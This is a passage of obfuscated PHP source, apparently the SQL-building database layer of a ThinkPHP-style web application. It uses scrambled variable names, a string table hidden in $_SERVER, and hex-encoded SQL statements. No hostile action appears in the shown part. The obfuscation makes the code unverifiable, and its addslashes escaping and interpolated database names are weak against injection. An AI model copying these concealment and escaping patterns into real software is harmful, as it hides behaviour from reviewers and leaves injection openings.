$this->parseKey($‚‘ïƒüÙ, !1) . $‡ˆØâ“à[1086] . $this->parseKey($àÔ®œ³Æ); } else { $óØŒ§ƒ[] = $this->parseKey($àÔ®œ³Æ); } } $‘¸Ÿ“ç× = implode($‡ˆØâ“à[50], $óØŒ§ƒ); } elseif (is_string($Êú–±ÍÔ) && !empty($Êú–±ÍÔ)) { $‘¸Ÿ“ç× = $Êú–±ÍÔ; } else { $‘¸Ÿ“ç× = $‡ˆØâ“à[220]; } return $‘¸Ÿ“ç×; } protected function parseTable($ÖåîºÃ) { $€ç‹Üò„ =& $_SERVER[§Êá¸İ]; if (is_array($ÖåîºÃ)) { $æ®„‘˜ = array(); foreach ($ÖåîºÃ as $ßÅŒ“¦É => $´ªÈ²—ë) { if (!is_numeric($ßÅŒ“¦É)) { $æ®„‘˜[] = $this->parseKey($ßÅŒ“¦É) . $€ç‹Üò„[53] . $this->parseKey($´ªÈ²—ë); } else { $æ®„‘˜[] = $this->parseKey($ßÅŒ“¦É); } } $ÖåîºÃ = $æ®„‘˜; } elseif (is_string($ÖåîºÃ)) { if (strstr($ÖåîºÃ, $€ç‹Üò„[53])) { return $ÖåîºÃ; } $ÖåîºÃ = explode($€ç‹Üò„[50], $ÖåîºÃ); array_walk($ÖåîºÃ, array($this, $€ç‹Üò„[993])); } return $€ç‹Üò„[987] . trim(implode($€ç‹Üò„[1087], $ÖåîºÃ), $€ç‹Üò„[461]) . $€ç‹Üò„[987]; } protected function parseWhere($º×åû¶») { $•ì¤²ƒ =& $_SERVER[§Êá¸İ]; $Íõõœ–ó = $•ì¤²ƒ[12]; if (is_string($º×åû¶»)) { $Íõõœ–ó = $º×åû¶»; } else { $İÌ˜ò¹ = isset($º×åû¶»[$•ì¤²ƒ[1088]]) ? strtoupper($º×åû¶»[$•ì¤²ƒ[1088]]) : $•ì¤²ƒ[12]; if (in_array($İÌ˜ò¹, array($•ì¤²ƒ[1089], $•ì¤²ƒ[1090], $•ì¤²ƒ[1091]))) { $İÌ˜ò¹ = $•ì¤²ƒ[53] . $İÌ˜ò¹ . $•ì¤²ƒ[53]; unset($º×åû¶»[$•ì¤²ƒ[1088]]); } else { $İÌ˜ò¹ = $•ì¤²ƒ[1092]; } foreach ($º×åû¶» as $ú¹ığ => $äîÀ§·) { $Íõõœ–ó .= $•ì¤²ƒ[354]; if (is_numeric($ú¹ığ)) { $ú¹ığ = $•ì¤²ƒ[1093]; } if (0 === strpos($ú¹ığ, $•ì¤²ƒ[11])) { $Íõõœ–ó .= $this->parseThinkWhere($ú¹ığ, $äîÀ§·); } else { if (!preg_match($•ì¤²ƒ[1094], trim($ú¹ığ))) { think_exception(think_lang($•ì¤²ƒ[1095]) . $•ì¤²ƒ[4] . $ú¹ığ); } $È‹ğ›¡Ô = is_array($äîÀ§·) && isset($äîÀ§·[$•ì¤²ƒ[1096]]); $ú¹ığ = trim($ú¹ığ); if (strpos($ú¹ığ, $•ì¤²ƒ[214])) { $ıÑ™ÃÆÍ = explode($•ì¤²ƒ[214], $ú¹ığ); $ÛúÁàô = array(); foreach ($ıÑ™ÃÆÍ as $¨Ú²èí => $á¢–ĞÏê) { $ëúœ÷ÙÒ = $È‹ğ›¡Ô ? $äîÀ§·[$¨Ú²èí] : $äîÀ§·; $ÛúÁàô[] = $•ì¤²ƒ[337] . $this->parseWhereItem($this->parseKey($á¢–ĞÏê), $ëúœ÷ÙÒ) . $•ì¤²ƒ[992]; } $Íõõœ–ó .= implode($•ì¤²ƒ[1097], $ÛúÁàô); } elseif (strpos($ú¹ığ, $•ì¤²ƒ[360])) { $ıÑ™ÃÆÍ = explode($•ì¤²ƒ[360], $ú¹ığ); $ÛúÁàô = array(); foreach ($ıÑ™ÃÆÍ as $¨Ú²èí => $á¢–ĞÏê) { $ëúœ÷ÙÒ = $È‹ğ›¡Ô ? $äîÀ§·[$¨Ú²èí] : $äîÀ§·; $ÛúÁàô[] = $•ì¤²ƒ[337] . $this->parseWhereItem($this->parseKey($á¢–ĞÏê), $ëúœ÷ÙÒ) . $•ì¤²ƒ[992]; } $Íõõœ–ó .= implode($•ì¤²ƒ[1092], $ÛúÁàô); } else { $Íõõœ–ó .= $this->parseWhereItem($this->parseKey($ú¹ığ), $äîÀ§·); } } $Íõõœ–ó .= $•ì¤²ƒ[355] . $İÌ˜ò¹; } $Íõõœ–ó = substr($Íõõœ–ó, 0, -strlen($İÌ˜ò¹)); } return empty($Íõõœ–ó) ? $•ì¤²ƒ[12] : $•ì¤²ƒ[1098] . $Íõõœ–ó; } protected function parseWhereItem($„ßÒŠŞö, $õ‘šåË®) { $ğÕ‡å—ƒ =& $_SERVER[§Êá¸İ]; $¿‰™‡ä = $ğÕ‡å—ƒ[12]; if (is_array($õ‘šåË®)) { if (is_string($õ‘šåË®[0])) { $ÈÊ¶¥é = strtolower($õ‘šåË®[0]); if (in_array($õ‘šåË®[0], array($ğÕ‡å—ƒ[971], $ğÕ‡å—ƒ[1099], $ğÕ‡å—ƒ[1100], $ğÕ‡å—ƒ[1101], $ğÕ‡å—ƒ[1102], $ğÕ‡å—ƒ[1103]))) { $¿‰™‡ä .= $„ßÒŠŞö . $ğÕ‡å—ƒ[53] . $õ‘šåË®[0] . $ğÕ‡å—ƒ[53] . $this->parseValue($õ‘šåË®[1]); } elseif (preg_match($ğÕ‡å—ƒ[1104], $õ‘šåË®[0])) { $¿‰™‡ä .= $„ßÒŠŞö . $ğÕ‡å—ƒ[53] . $this->exp[$ÈÊ¶¥é] . $ğÕ‡å—ƒ[53] . $this->parseValue($õ‘šåË®[1]); } elseif (preg_match($ğÕ‡å—ƒ[1105], $õ‘šåË®[0])) { if (is_array($õ‘šåË®[1])) { $‘´Šæä = isset($õ‘šåË®[2]) ? strtoupper($õ‘šåË®[2]) : $ğÕ‡å—ƒ[1090]; if (in_array($‘´Šæä, array($ğÕ‡å—ƒ[1089], $ğÕ‡å—ƒ[1090], $ğÕ‡å—ƒ[1091]))) { $ıØ±ª–¹ = array(); foreach ($õ‘šåË®[1] as $ ê‚ƒïı) { $ıØ±ª–¹[] = $„ßÒŠŞö . $ğÕ‡å—ƒ[53] . $this->exp[$ÈÊ¶¥é] . $ğÕ‡å—ƒ[53] . $this->parseValue($ ê‚ƒïı); } $¿‰™‡ä .= $ğÕ‡å—ƒ[337] . implode($ğÕ‡å—ƒ[53] . $‘´Šæä . $ğÕ‡å—ƒ[53], $ıØ±ª–¹) . $ğÕ‡å—ƒ[992]; } } else { $¿‰™‡ä .= $„ßÒŠŞö . $ğÕ‡å—ƒ[53] . $this->exp[$ÈÊ¶¥é] . $ğÕ‡å—ƒ[53] . $this->parseValue($õ‘šåË®[1]); } } elseif ($ğÕ‡å—ƒ[373] == $ÈÊ¶¥é) { $¿‰™‡ä .= $ğÕ‡å—ƒ[990] . $„ßÒŠŞö . $ğÕ‡å—ƒ[53] . $õ‘šåË®[1] . $ğÕ‡å—ƒ[1106]; } elseif (preg_match($ğÕ‡å—ƒ[1107], $õ‘šåË®[0])) { $¿‰™‡ä .= $õ‘šåË®[0]; } elseif (preg_match($ğÕ‡å—ƒ[1108], $õ‘šåË®[0])) { if (isset($õ‘šåË®[2]) && $ğÕ‡å—ƒ[373] == $õ‘šåË®[2]) { $¿‰™‡ä .= $„ßÒŠŞö . $ğÕ‡å—ƒ[53] . $this->exp[$ÈÊ¶¥é] . $ğÕ‡å—ƒ[53] . $õ‘šåË®[1]; } else { if (is_string($õ‘šåË®[1])) { $õ‘šåË®[1] = explode($ğÕ‡å—ƒ[50], $õ‘šåË®[1]); } $Ò•­ˆÄ¶ = implode($ğÕ‡å—ƒ[50], $this->parseValue($õ‘šåË®[1])); $¿‰™‡ä .= $„ßÒŠŞö . $ğÕ‡å—ƒ[53] . $this->exp[$ÈÊ¶¥é] . $ğÕ‡å—ƒ[990] . $Ò•­ˆÄ¶ . $ğÕ‡å—ƒ[992]; } } elseif (preg_match($ğÕ‡å—ƒ[1109], $õ‘šåË®[0])) { $¨ëìıË = is_string($õ‘šåË®[1]) ? explode($ğÕ‡å—ƒ[50], $õ‘šåË®[1]) : $õ‘šåË®[1]; $¿‰™‡ä .= $ğÕ‡å—ƒ[990] . $„ßÒŠŞö . $ğÕ‡å—ƒ[53] . $this->exp[$ÈÊ¶¥é] . $ğÕ‡å—ƒ[53] . $this->parseValue($¨ëìıË[0]) . $ğÕ‡å—ƒ[1092] . $this->parseValue($¨ëìıË[1]) . $ğÕ‡å—ƒ[355]; } else { think_exception(think_lang($ğÕ‡å—ƒ[1095]) . $ğÕ‡å—ƒ[4] . $õ‘šåË®[0]); } } else { $Õ´ïµæã = count($õ‘šåË®); $Æ¾Í¾ƒ = $ğÕ‡å—ƒ[12]; if (is_string($õ‘šåË®[$Õ´ïµæã - 1])) { $Æ¾Í¾ƒ = isset($õ‘šåË®[$Õ´ïµæã - 1]) ? strtoupper($õ‘šåË®[$Õ´ïµæã - 1]) : $ğÕ‡å—ƒ[12]; if (in_array($Æ¾Í¾ƒ, array($ğÕ‡å—ƒ[1089], $ğÕ‡å—ƒ[1090], $ğÕ‡å—ƒ[1091]))) { $Õ´ïµæã = $Õ´ïµæã - 1; } } else { $Æ¾Í¾ƒ = $ğÕ‡å—ƒ[1089]; } for ($Ä‹İµ û = 0; $Ä‹İµ û < $Õ´ïµæã; $Ä‹İµ û++) { $¨ëìıË = is_array($õ‘šåË®[$Ä‹İµ û]) ? $õ‘šåË®[$Ä‹İµ û][1] : $õ‘šåË®[$Ä‹İµ û]; if ($ğÕ‡å—ƒ[373] == strtolower($õ‘šåË®[$Ä‹İµ û][0])) { $¿‰™‡ä .= $ğÕ‡å—ƒ[337] . $„ßÒŠŞö . $ğÕ‡å—ƒ[53] . $¨ëìıË . $ğÕ‡å—ƒ[1106] . $Æ¾Í¾ƒ . $ğÕ‡å—ƒ[53]; } else { $°ê¾ïÜ· = is_array($õ‘šåË®[$Ä‹İµ û]) ? $this->exp[strtolower($õ‘šåË®[$Ä‹İµ û][0])] : $ğÕ‡å—ƒ[971]; if (!$°ê¾ïÜ· && is_array($õ‘šåË®[$Ä‹İµ û]) && in_array($õ‘šåË®[$Ä‹İµ û][0], array($ğÕ‡å—ƒ[971], $ğÕ‡å—ƒ[1099], $ğÕ‡å—ƒ[1100], $ğÕ‡å—ƒ[1101], $ğÕ‡å—ƒ[1102], $ğÕ‡å—ƒ[1103]))) { $°ê¾ïÜ· = $õ‘šåË®[$Ä‹İµ û][0]; } $¿‰™‡ä .= $ğÕ‡å—ƒ[337] . $„ßÒŠŞö . $ğÕ‡å—ƒ[53] . $°ê¾ïÜ· . $ğÕ‡å—ƒ[53] . $this->parseValue($¨ëìıË) . $ğÕ‡å—ƒ[1106] . $Æ¾Í¾ƒ . $ğÕ‡å—ƒ[53]; } } $¿‰™‡ä = substr($¿‰™‡ä, 0, -4); } } else { $¿‰™‡ä .= $„ßÒŠŞö . $ğÕ‡å—ƒ[1110] . $this->parseValue($õ‘šåË®); } return $¿‰™‡ä; } protected function parseThinkWhere($­‰ÊÕç, $áÍˆ­Œ) { $ÙÅóçî =& $_SERVER[§Êá¸İ]; $¾©²Ï´Æ = $ÙÅóçî[12]; switch ($­‰ÊÕç) { case $ÙÅóçî[428]: $¾©²Ï´Æ = $áÍˆ­Œ; break; case $ÙÅóçî[1093]: $¾©²Ï´Æ = is_string($áÍˆ­Œ) ? $áÍˆ­Œ : substr($this->parseWhere($áÍˆ­Œ), 6); break; case $ÙÅóçî[1111]: parse_str($áÍˆ­Œ, $ªêï˜°â); if (isset($ªêï˜°â[$ÙÅóçî[1088]])) { $÷ñ§ßÏ» = $ÙÅóçî[53] . strtoupper($ªêï˜°â[$ÙÅóçî[1088]]) . $ÙÅóçî[53]; unset($ªêï˜°â[$ÙÅóçî[1088]]); } else { $÷ñ§ßÏ» = $ÙÅóçî[1092]; } $É¿›¢ş‡ = array(); foreach ($ªêï˜°â as $Ş¶•ûÑº => $‡ßáêä) { $É¿›¢ş‡[] = $this->parseKey($Ş¶•ûÑº) . $ÙÅóçî[1110] . $this->parseValue($‡ßáêä); } $¾©²Ï´Æ = implode($÷ñ§ßÏ», $É¿›¢ş‡); break; } return $¾©²Ï´Æ; } protected function parseLimit($³´ªäË²) { $ßûŠ´Øº =& $_SERVER[§Êá¸İ]; return !empty($³´ªäË²) ? $ßûŠ´Øº[51] . $³´ªäË² . $ßûŠ´Øº[53] : $ßûŠ´Øº[12]; } protected function parseJoin($Ã†¥öú‰) { $àÇºº =& $_SERVER[§Êá¸İ]; $Öö¥”›Ã = $àÇºº[12]; if (!empty($Ã†¥öú‰)) { if (is_array($Ã†¥öú‰)) { foreach ($Ã†¥öú‰ as $øØÜ¨é— => $«º¥¡÷) { if (!1 !== stripos($«º¥¡÷, $àÇºº[1112])) { $Öö¥”›Ã .= $àÇºº[53] . $«º¥¡÷; } else { $Öö¥”›Ã .= $àÇºº[1113] . $«º¥¡÷; } } } else { $Öö¥”›Ã .= $àÇºº[1113] . $Ã†¥öú‰; } } $Öö¥”›Ã = preg_replace($àÇºº[1114], think_config($àÇºº[1018]) . $àÇºº[1115], $Öö¥”›Ã); return $Öö¥”›Ã; } protected function parseOrder($—²ÀëÏš) { $Ş¿¾ñì“ =& $_SERVER[§Êá¸İ]; if (is_array($—²ÀëÏš)) { $½İªå€Ä = array(); foreach ($—²ÀëÏš as $°Š‡®ÊÇ => $Šü‚ñúÔ) { if (is_numeric($°Š‡®ÊÇ)) { $½İªå€Ä[] = $this->parseKey($Šü‚ñúÔ); } else { $Šü‚ñúÔ = in_array(strtoupper(trim($Šü‚ñúÔ)), array($Ş¿¾ñì“[1116], $Ş¿¾ñì“[1117])) ? $Ş¿¾ñì“[53] . $Šü‚ñúÔ : $Ş¿¾ñì“[12]; if (preg_match($Ş¿¾ñì“[1118], $°Š‡®ÊÇ)) { $½İªå€Ä[] = $this->parseKey($°Š‡®ÊÇ) . $Šü‚ñúÔ; } else { think_exception($Ş¿¾ñì“[1119] . $°Š‡®ÊÇ); } } } $—²ÀëÏš = implode($Ş¿¾ñì“[50], $½İªå€Ä); } return !empty($—²ÀëÏš) ? $Ş¿¾ñì“[1120] . $—²ÀëÏš : $Ş¿¾ñì“[12]; } protected function parseGroup($˜äŞÙ÷Ç) { $Æ¯ìÁó¬ =& $_SERVER[§Êá¸İ]; return !empty($˜äŞÙ÷Ç) ? $Æ¯ìÁó¬[1121] . $˜äŞÙ÷Ç : $Æ¯ìÁó¬[12]; } protected function parseHaving($Î†ÀˆŠƒ) { $š¦’“è™ =& $_SERVER[§Êá¸İ]; return !empty($Î†ÀˆŠƒ) ? $š¦’“è™[1122] . $Î†ÀˆŠƒ : $š¦’“è™[12]; } protected function parseComment($àáÛÖŞ‘) { $²ºÆ¤®¡ =& $_SERVER[§Êá¸İ]; return !empty($àáÛÖŞ‘) ? $²ºÆ¤®¡[1123] . $àáÛÖŞ‘ . $²ºÆ¤®¡[1124] : $²ºÆ¤®¡[12]; } protected function parseDistinct($¿Ãäµ¶) { $ë®‹ã½© =& $_SERVER[§Êá¸İ]; return !empty($¿Ãäµ¶) ? $ë®‹ã½©[1125] : $ë®‹ã½©[12]; } protected function parseUnion($ì»«ä¸Ô) { $å‰êà =& $_SERVER[§Êá¸İ]; if (empty($ì»«ä¸Ô)) { return $å‰êà[12]; } if (isset($ì»«ä¸Ô[$å‰êà[424]])) { $ƒ„¦À¡† = $å‰êà[1126]; unset($ì»«ä¸Ô[$å‰êà[424]]); } else { $ƒ„¦À¡† = $å‰êà[1127]; } foreach ($ì»«ä¸Ô as $„ğ¿–ÜŠ) { $€ƒØâ[] = $ƒ„¦À¡† . (is_array($„ğ¿–ÜŠ) ? $this->buildSelectSql($„ğ¿–ÜŠ) : $„ğ¿–ÜŠ); } return implode($å‰êà[53], $€ƒØâ); } public function insert($¤°í†é©, $ªğ“óÎß = array(), $”¹ò‹Ÿ = false) { $÷éÂ×Û¦ =& $_SERVER[§Êá¸İ]; $üÕé·…€ = $¸Õ‡ñ´ = array(); $this->model = $ªğ“óÎß[$÷éÂ×Û¦[358]]; foreach ($¤°í†é© as $ºû§ÍêÜ => $éÜÜÁ°ˆ) { if (is_array($éÜÜÁ°ˆ) && $÷éÂ×Û¦[373] == $éÜÜÁ°ˆ[0]) { $¸Õ‡ñ´[] = $this->parseKey($ºû§ÍêÜ); $üÕé·…€[] = $éÜÜÁ°ˆ[1]; } elseif (is_scalar($éÜÜÁ°ˆ) || is_null($éÜÜÁ°ˆ)) { $¸Õ‡ñ´[] = $this->parseKey($ºû§ÍêÜ); $üÕé·…€[] = $this->parseValue($éÜÜÁ°ˆ); } } $¿‹ëÛÓ™ = ($”¹ò‹Ÿ ? $÷éÂ×Û¦[994] : $÷éÂ×Û¦[995]) . $÷éÂ×Û¦[996] . $this->parseTable($ªğ“óÎß[$÷éÂ×Û¦[356]]) . $÷éÂ×Û¦[990] . implode($÷éÂ×Û¦[50], $¸Õ‡ñ´) . $÷éÂ×Û¦[991] . implode($÷éÂ×Û¦[50], $üÕé·…€) . $÷éÂ×Û¦[992]; $¿‹ëÛÓ™ .= $this->parseLock(isset($ªğ“óÎß[$÷éÂ×Û¦[930]]) ? $ªğ“óÎß[$÷éÂ×Û¦[930]] : !1); $¿‹ëÛÓ™ .= $this->parseComment(!empty($ªğ“óÎß[$÷éÂ×Û¦[430]]) ? $ªğ“óÎß[$÷éÂ×Û¦[430]] : $÷éÂ×Û¦[12]); return $this->execute($¿‹ëÛÓ™, $this->parseBind(!empty($ªğ“óÎß[$÷éÂ×Û¦[361]]) ? $ªğ“óÎß[$÷éÂ×Û¦[361]] : array())); } public function selectInsert($ÈÔğ·È, $ò¶ÍœŞ—, $ Ë¿¨®• = array()) { $‹›‹îü– =& $_SERVER[§Êá¸İ]; $this->model = $ Ë¿¨®•[$‹›‹îü–[358]]; if (is_string($ÈÔğ·È)) { $ÈÔğ·È = explode($‹›‹îü–[50], $ÈÔğ·È); } array_walk($ÈÔğ·È, array($this, $‹›‹îü–[993])); $Ö‚†‡ú¢ = $‹›‹îü–[1128] . $this->parseTable($ò¶ÍœŞ—) . $‹›‹îü–[990] . implode($‹›‹îü–[50], $ÈÔğ·È) . $‹›‹îü–[1106]; $Ö‚†‡ú¢ .= $this->buildSelectSql($ Ë¿¨®•); return $this->execute($Ö‚†‡ú¢, $this->parseBind(!empty($ Ë¿¨®•[$‹›‹îü–[361]]) ? $ Ë¿¨®•[$‹›‹îü–[361]] : array())); } public function update($›ÅÀÙ²ç, $‡Ä¢«Ê) { $ÓÜ™…ò¨ =& $_SERVER[§Êá¸İ]; $this->model = $‡Ä¢«Ê[$ÓÜ™…ò¨[358]]; $¢•ç…±é = $ÓÜ™…ò¨[1129] . $this->parseTable($‡Ä¢«Ê[$ÓÜ™…ò¨[356]]) . $this->parseSet($›ÅÀÙ²ç) . $this->parseWhere(!empty($‡Ä¢«Ê[$ÓÜ™…ò¨[352]]) ? $‡Ä¢«Ê[$ÓÜ™…ò¨[352]] : $ÓÜ™…ò¨[12]) . $this->parseOrder(!empty($‡Ä¢«Ê[$ÓÜ™…ò¨[441]]) ? $‡Ä¢«Ê[$ÓÜ™…ò¨[441]] : $ÓÜ™…ò¨[12]) . $this->parseLimit(!empty($‡Ä¢«Ê[$ÓÜ™…ò¨[368]]) ? $‡Ä¢«Ê[$ÓÜ™…ò¨[368]] : $ÓÜ™…ò¨[12]) . $this->parseLock(isset($‡Ä¢«Ê[$ÓÜ™…ò¨[930]]) ? $‡Ä¢«Ê[$ÓÜ™…ò¨[930]] : !1) . $this->parseComment(!empty($‡Ä¢«Ê[$ÓÜ™…ò¨[430]]) ? $‡Ä¢«Ê[$ÓÜ™…ò¨[430]] : $ÓÜ™…ò¨[12]); return $this->execute($¢•ç…±é, $this->parseBind(!empty($‡Ä¢«Ê[$ÓÜ™…ò¨[361]]) ? $‡Ä¢«Ê[$ÓÜ™…ò¨[361]] : array())); } public function delete($“åü÷¡ö = array()) { $üùá÷» =& $_SERVER[§Êá¸İ]; $this->model = $“åü÷¡ö[$üùá÷»[358]]; $ŒŸÕË±Ó = $üùá÷»[1130] . $this->parseTable($“åü÷¡ö[$üùá÷»[356]]) . $this->parseWhere(!empty($“åü÷¡ö[$üùá÷»[352]]) ? $“åü÷¡ö[$üùá÷»[352]] : $üùá÷»[12]) . $this->parseOrder(!empty($“åü÷¡ö[$üùá÷»[441]]) ? $“åü÷¡ö[$üùá÷»[441]] : $üùá÷»[12]) . $this->parseLimit(!empty($“åü÷¡ö[$üùá÷»[368]]) ? $“åü÷¡ö[$üùá÷»[368]] : $üùá÷»[12]) . $this->parseLock(isset($“åü÷¡ö[$üùá÷»[930]]) ? $“åü÷¡ö[$üùá÷»[930]] : !1) . $this->parseComment(!empty($“åü÷¡ö[$üùá÷»[430]]) ? $“åü÷¡ö[$üùá÷»[430]] : $üùá÷»[12]); return $this->execute($ŒŸÕË±Ó, $this->parseBind(!empty($“åü÷¡ö[$üùá÷»[361]]) ? $“åü÷¡ö[$üùá÷»[361]] : array())); } public function select($şĞˆüÇş = array()) { $²œ´¬Â´ =& $_SERVER[§Êá¸İ]; $this->model = $şĞˆüÇş[$²œ´¬Â´[358]]; $€î¾ŒùŠ = $this->buildSelectSql($şĞˆüÇş); $æº¶‡ë = isset($şĞˆüÇş[$²œ´¬Â´[425]]) ? $şĞˆüÇş[$²œ´¬Â´[425]] : !1; if ($æº¶‡ë) { $®…‚³ï = is_string($æº¶‡ë[$²œ´¬Â´[97]]) ? $æº¶‡ë[$²œ´¬Â´[97]] : $²œ´¬Â´[1131] . md5($€î¾ŒùŠ); $íÎ›ô‰Œ = think_cache($®…‚³ï, $²œ´¬Â´[12], $æº¶‡ë); if (!1 !== $íÎ›ô‰Œ) { return $íÎ›ô‰Œ; } } $£ø–á¨€ = $this->query($€î¾ŒùŠ, $this->parseBind(!empty($şĞˆüÇş[$²œ´¬Â´[361]]) ? $şĞˆüÇş[$²œ´¬Â´[361]] : array())); if ($æº¶‡ë && !1 !== $£ø–á¨€) { think_cache($®…‚³ï, $£ø–á¨€, $æº¶‡ë); } return $£ø–á¨€; } public function buildSelectSql($Œ‡ ªÌ¦ = array()) { $ßÄ†ÈÕ­ =& $_SERVER[§Êá¸İ]; if (isset($Œ‡ ªÌ¦[$ßÄ†ÈÕ­[429]])) { if (strpos($Œ‡ ªÌ¦[$ßÄ†ÈÕ­[429]], $ßÄ†ÈÕ­[50])) { list($ºÒş£ÓŸ, $ŞÎ¼ş˜í) = explode($ßÄ†ÈÕ­[50], $Œ‡ ªÌ¦[$ßÄ†ÈÕ­[429]]); } else { $ºÒş£ÓŸ = $Œ‡ ªÌ¦[$ßÄ†ÈÕ­[429]]; } $ºÒş£ÓŸ = $ºÒş£ÓŸ ? $ºÒş£ÓŸ : 1; $ŞÎ¼ş˜í = isset($ŞÎ¼ş˜í) ? $ŞÎ¼ş˜í : (is_numeric($Œ‡ ªÌ¦[$ßÄ†ÈÕ­[368]]) ? $Œ‡ ªÌ¦[$ßÄ†ÈÕ­[368]] : 20); $›÷Û¤¿ = $ŞÎ¼ş˜í * ((int) $ºÒş£ÓŸ - 1); $Œ‡ ªÌ¦[$ßÄ†ÈÕ­[368]] = $›÷Û¤¿ . $ßÄ†ÈÕ­[50] . $ŞÎ¼ş˜í; } if (think_config($ßÄ†ÈÕ­[1132])) { $©ÂÏêò… = $ßÄ†ÈÕ­[1133] . md5(serialize($Œ‡ ªÌ¦)); $ûÀ³ä = think_cache($©ÂÏêò…); if ($ûÀ³ä) { return $ûÀ³ä; } } $¼Ú¦¬ù¸ = $this->parseSql($this->selectSql, $Œ‡ ªÌ¦); $¼Ú¦¬ù¸ .= $this->parseLock(isset($Œ‡ ªÌ¦[$ßÄ†ÈÕ­[930]]) ? $Œ‡ ªÌ¦[$ßÄ†ÈÕ­[930]] : !1); if (isset($©ÂÏêò…)) { think_cache($©ÂÏêò…, $¼Ú¦¬ù¸); } return $¼Ú¦¬ù¸; } public function parseSql($Òøœ’ª, $…“¸»çâ = array()) { $Ş˜â±ê =& $_SERVER[§Êá¸İ]; $Òøœ’ª = str_replace(array($Ş˜â±ê[1134], $Ş˜â±ê[1135], $Ş˜â±ê[1136], $Ş˜â±ê[1137], $Ş˜â±ê[1138], $Ş˜â±ê[1139], $Ş˜â±ê[1140], $Ş˜â±ê[1141], $Ş˜â±ê[1142], $Ş˜â±ê[1143], $Ş˜â±ê[1144]), array($this->parseTable("{$…“¸»çâ[$Ş˜â±ê[356]]}"), $this->parseDistinct(isset($…“¸»çâ[$Ş˜â±ê[1145]]) ? $…“¸»çâ[$Ş˜â±ê[1145]] : !1), $this->parseField(!empty($…“¸»çâ[$Ş˜â±ê[350]]) ? $…“¸»çâ[$Ş˜â±ê[350]] : $Ş˜â±ê[220]), $this->parseJoin(!empty($…“¸»çâ[$Ş˜â±ê[359]]) ? $…“¸»çâ[$Ş˜â±ê[359]] : $Ş˜â±ê[12]), $this->parseWhere(!empty($…“¸»çâ[$Ş˜â±ê[352]]) ? $…“¸»çâ[$Ş˜â±ê[352]] : $Ş˜â±ê[12]), $this->parseGroup(!empty($…“¸»çâ[$Ş˜â±ê[586]]) ? $…“¸»çâ[$Ş˜â±ê[586]] : $Ş˜â±ê[12]), $this->parseHaving(!empty($…“¸»çâ[$Ş˜â±ê[1146]]) ? $…“¸»çâ[$Ş˜â±ê[1146]] : $Ş˜â±ê[12]), $this->parseOrder(!empty($…“¸»çâ[$Ş˜â±ê[441]]) ? $…“¸»çâ[$Ş˜â±ê[441]] : $Ş˜â±ê[12]), $this->parseLimit(!empty($…“¸»çâ[$Ş˜â±ê[368]]) ? $…“¸»çâ[$Ş˜â±ê[368]] : $Ş˜â±ê[12]), $this->parseUnion(!empty($…“¸»çâ[$Ş˜â±ê[423]]) ? $…“¸»çâ[$Ş˜â±ê[423]] : $Ş˜â±ê[12]), $this->parseComment(!empty($…“¸»çâ[$Ş˜â±ê[430]]) ? $…“¸»çâ[$Ş˜â±ê[430]] : $Ş˜â±ê[12])), $Òøœ’ª); return $Òøœ’ª; } public function getLastSql($ãœ¤×úÓ = '') { return $ãœ¤×úÓ ? $this->modelSql[$ãœ¤×úÓ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($íºÄ©Œ¯) { return addslashes($íºÄ©Œ¯); } public function setModel($‹œ‘Ÿ…ˆ) { $this->model = $‹œ‘Ÿ…ˆ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($«ÄŒ†ÍÌ = array()) { $´Ë³­¼æ =& $_SERVER[§Êá¸İ]; if (empty($«ÄŒ†ÍÌ)) { $«ÄŒ†ÍÌ = $GLOBALS[$´Ë³­¼æ[6]][$´Ë³­¼æ[21]]; } $this->database = $«ÄŒ†ÍÌ; } public function model($ª¶Š†ŸĞ = '') { return new ModelBase($ª¶Š†ŸĞ, $_SERVER[§Êá¸İ][12], $this->database); } public function db($«¯õŒæ = false) { $ÎíĞ‹Ãû =& $_SERVER[§Êá¸İ]; $­€°½° = array_change_key_case($this->database); if ($this->dbType() == $ÎíĞ‹Ãû[13] || !$«¯õŒæ) { return $this->model()->db(); } $úûºÈÌÊ = $­€°½°[$ÎíĞ‹Ãû[1060]]; $­€°½°[$ÎíĞ‹Ãû[1060]] = $ÎíĞ‹Ãû[12]; if ($­€°½°[$ÎíĞ‹Ãû[1055]] == $ÎíĞ‹Ãû[1052]) { $­éëª = $­€°½°[$ÎíĞ‹Ãû[1061]]; $­€°½°[$ÎíĞ‹Ãû[1061]] = substr($­éëª, 0, strrpos($­éëª, $ÎíĞ‹Ãû[1147])); } $this->database = $­€°½°; $³ò»øø¤ = $this->model()->db(); try { $í®©ô = $³ò»øø¤->execute("\x73\150\157\167\x20\144\141\x74\141\142\x61\x73\x65\163\40\x6c\151\x6b\x65\x20\47{$úûºÈÌÊ}\x27"); } catch (Exception $›øï¾Î‹) { } if (!$í®©ô) { $³ò»øø¤->execute("\143\x72\145\141\164\x65\x20\144\141\x74\x61\142\141\x73\x65\40\140{$úûºÈÌÊ}\140"); } $­€°½°[$ÎíĞ‹Ãû[1060]] = $úûºÈÌÊ; if ($­€°½°[$ÎíĞ‹Ãû[1055]] == $ÎíĞ‹Ãû[1052]) { $­€°½°[$ÎíĞ‹Ãû[1061]] .= $ÎíĞ‹Ãû[1147] . $úûºÈÌÊ; } $this->database = $­€°½°; $³ò»øø¤->execute("\x75\x73\145\x20\140{$úûºÈÌÊ}\x60"); return $³ò»øø¤; } public function createTable($óë—š±Ï, &$µÔÁí²æ) { $¹Ç–ò•ñ =& $_SERVER[§Êá¸İ]; if (!IO::exist($óë—š±Ï)) { ActionCall($¹Ç–ò•ñ[1148], !0, 0); show_json(LNG($¹Ç–ò•ñ[1149]), !1); } $Ÿªû‚‡· = $this->model()->db(); $­¦ìğ°‡ = sqlSplit(IO::getContent($óë—š±Ï)); foreach ($­¦ìğ°‡ as $„·–ëí) { $ù•¡Úü = stripos($„·–ëí, $¹Ç–ò•ñ[1150]) === 0; if ($ù•¡Úü) { $µÔÁí²æ->task[$¹Ç–ò•ñ[1151]] += 1; } $Ÿªû‚‡·->execute($„·–ëí); if ($ù•¡Úü) { preg_match($¹Ç–ò•ñ[1152], $„·–ëí, $æç‘åš÷); $µÔÁí²æ->task[$¹Ç–ò•ñ[1153]] = $æç‘åš÷[1]; $µÔÁí²æ->update(1); } } } public function insertTable($ÛıÙƒ„«, &$ËÛ­˜Ï©) { $ìÆÈÈŒ =& $_SERVER[§Êá¸İ]; $Ø³¡€Ö = $this->model()->db(); $ØÚş§›³ = $Ã‡½½”õ ? 